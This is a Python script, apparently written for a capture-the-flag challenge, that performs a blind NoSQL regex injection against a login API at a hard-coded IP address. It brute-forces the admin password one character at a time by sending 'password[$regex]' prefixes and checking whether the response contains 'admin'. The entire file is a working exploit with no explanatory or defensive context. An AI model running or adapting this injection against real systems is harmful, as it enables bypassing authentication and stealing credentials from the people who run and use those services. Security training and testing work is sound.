#!/usr/bin/env python3
import requests
import string
import json
import signal
import sys

url = 'http://188.166.156.174:32290/api/login'
alpha = '_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}~'

class colour:
   GREEN = '\033[1;32;48m'
   RED = '\033[0;31;48m'
   END = '\033[1;37;0m'

def signal_handler(sig, frame):
    print('\033[?25h', end = '\r')
    print('Injection canceled!')
    sys.exit(0)

def makeReq(payload):
    data = {
            "username": "admin",
            "password[$regex]": f"^{payload}"
            }
    headers = {
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
            }
    
    r = requests.post(url, data=data, headers=headers)
    return r.text

signal.signal(signal.SIGINT, signal_handler)
chars_exhausted = False
i = 1
flag = ''
print('\033[?25l', end = '\r')

while not chars_exhausted:
    for c in alpha:
        print(f'{colour.GREEN}{flag}{colour.END}{colour.RED}{c}{colour.END}', end = '\r')
        if 'admin' in makeReq(flag + c):
            flag += c
            i += 1
            break
        elif c == '~':
            print('')
            chars_exhausted = True
    
print('\033[?25h', end = '\r')
print(flag)
